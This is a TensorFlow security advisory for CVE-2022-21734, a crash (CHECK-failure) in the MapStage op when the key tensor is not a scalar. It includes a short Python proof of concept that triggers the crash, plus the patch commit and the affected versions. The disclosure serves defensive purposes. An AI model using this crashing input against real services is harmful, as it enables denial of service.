<h2>TFSA-2022-013: <code>CHECK</code>-failures in <code>MapStage</code></h2>
<h3>CVE Number</h3>
<p>CVE-2022-21734</p>
<h3>Impact</h3>
<p>The <a href="https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/map_stage_op.cc#L519-L550">implementation of <code>MapStage</code></a> is vulnerable a <code>CHECK</code>-fail if the key tensor is not a scalar:</p>
<p>```python
import tensorflow as tf
import numpy as np</p>
<p>tf.raw_ops.MapStage(
    key = tf.constant(value=[4], shape= (1,2), dtype=tf.int64),
    indices = np.array([[6]]),
    values = np.array([-60]),
    dtypes = [tf.int64], capacity=0, memory_limit=0,
    container='', shared_name='', name=None
)
```</p>
<h3>Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/f57315566d7094f322b784947093406c2aea0d7d">f57315566d7094f322b784947093406c2aea0d7d</a>.</p>
<p>The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.</p>
